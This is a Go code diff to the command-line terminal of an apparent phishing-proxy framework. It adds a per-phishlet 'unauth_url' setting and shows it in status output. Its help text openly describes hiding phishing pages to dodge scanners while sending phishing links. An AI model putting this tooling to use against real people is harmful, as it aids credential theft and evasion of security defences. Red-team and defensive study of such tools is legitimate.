@@ -634,6 +634,13 @@ func (t *Terminal) handlePhishlets(args []string) error {
 				t.manageCertificates(false)
 			}
 			return nil
+		case "unauth_url":
+			_, err := t.cfg.GetPhishlet(args[1])
+			if err != nil {
+				return err
+			}
+			t.cfg.SetSiteUnauthUrl(args[1], args[2])
+			return nil
 		}
 	}
 	return fmt.Errorf("invalid syntax: %s", args)
@@ -1047,12 +1054,14 @@ func (t *Terminal) createHelp() {
 		readline.PcItem("phishlets", readline.PcItem("create", readline.PcItemDynamic(t.phishletPrefixCompleter)), readline.PcItem("delete", readline.PcItemDynamic(t.phishletPrefixCompleter)),
 			readline.PcItem("hostname", readline.PcItemDynamic(t.phishletPrefixCompleter)), readline.PcItem("enable", readline.PcItemDynamic(t.phishletPrefixCompleter)),
 			readline.PcItem("disable", readline.PcItemDynamic(t.phishletPrefixCompleter)), readline.PcItem("hide", readline.PcItemDynamic(t.phishletPrefixCompleter)),
-			readline.PcItem("unhide", readline.PcItemDynamic(t.phishletPrefixCompleter)), readline.PcItem("get-hosts", readline.PcItemDynamic(t.phishletPrefixCompleter))))
+			readline.PcItem("unhide", readline.PcItemDynamic(t.phishletPrefixCompleter)), readline.PcItem("get-hosts", readline.PcItemDynamic(t.phishletPrefixCompleter)),
+			readline.PcItem("unauth_url", readline.PcItemDynamic(t.phishletPrefixCompleter))))
 	h.AddSubCommand("phishlets", nil, "", "show status of all available phishlets")
 	h.AddSubCommand("phishlets", nil, "<phishlet>", "show details of a specific phishlets")
 	h.AddSubCommand("phishlets", []string{"create"}, "create <phishlet> <child_name> <key1=value1> <key2=value2>", "create child phishlet from a template phishlet with custom parameters")
 	h.AddSubCommand("phishlets", []string{"delete"}, "delete <phishlet>", "delete child phishlet")
 	h.AddSubCommand("phishlets", []string{"hostname"}, "hostname <phishlet> <hostname>", "set hostname for given phishlet (e.g. this.is.not.a.phishing.site.evilsite.com)")
+	h.AddSubCommand("phishlets", []string{"unauth_url"}, "unauth_url <phishlet> <url>", "override global unauth_url just for this phishlet")
 	h.AddSubCommand("phishlets", []string{"enable"}, "enable <phishlet>", "enables phishlet and requests ssl/tls certificate if needed")
 	h.AddSubCommand("phishlets", []string{"disable"}, "disable <phishlet>", "disables phishlet")
 	h.AddSubCommand("phishlets", []string{"hide"}, "hide <phishlet>", "hides the phishing page, logging and redirecting all requests to it (good for avoiding scanners when sending out phishing links)")
@@ -1189,6 +1198,7 @@ func (t *Terminal) manageCertificates(verbose bool) {
 
 func (t *Terminal) sprintPhishletStatus(site string) string {
 	higreen := color.New(color.FgHiGreen)
+	logreen := color.New(color.FgGreen)
 	hiblue := color.New(color.FgHiBlue)
 	blue := color.New(color.FgBlue)
 	cyan := color.New(color.FgHiCyan)
@@ -1196,7 +1206,7 @@ func (t *Terminal) sprintPhishletStatus(site string) string {
 	higray := color.New(color.FgWhite)
 	logray := color.New(color.FgHiBlack)
 	n := 0
-	cols := []string{"phishlet", "status", "visibility", "hostname"}
+	cols := []string{"phishlet", "status", "visibility", "hostname", "unauth_url"}
 	var rows [][]string
 
 	var pnames []string
@@ -1224,6 +1234,7 @@ func (t *Terminal) sprintPhishletStatus(site string) string {
 				hidden_status = logray.Sprint("hidden")
 			}
 			domain, _ := t.cfg.GetSiteDomain(s)
+			unauth_url, _ := t.cfg.GetSiteUnauthUrl(s)
 			n += 1
 
 			if s == site {
@@ -1238,11 +1249,11 @@ func (t *Terminal) sprintPhishletStatus(site string) string {
 					}
 				}
 
-				keys := []string{"phishlet", "parent", "status", "visibility", "hostname", "params"}
-				vals := []string{hiblue.Sprint(s), blue.Sprint(pl.ParentName), status, hidden_status, cyan.Sprint(domain), logray.Sprint(param_names)}
+				keys := []string{"phishlet", "parent", "status", "visibility", "hostname", "unauth_url", "params"}
+				vals := []string{hiblue.Sprint(s), blue.Sprint(pl.ParentName), status, hidden_status, cyan.Sprint(domain), logreen.Sprint(unauth_url), logray.Sprint(param_names)}
 				return AsRows(keys, vals)
 			} else if site == "" {
-				rows = append(rows, []string{hiblue.Sprint(s), status, hidden_status, cyan.Sprint(domain)})
+				rows = append(rows, []string{hiblue.Sprint(s), status, hidden_status, cyan.Sprint(domain), logreen.Sprint(unauth_url)})
 			}
 		}
 	}
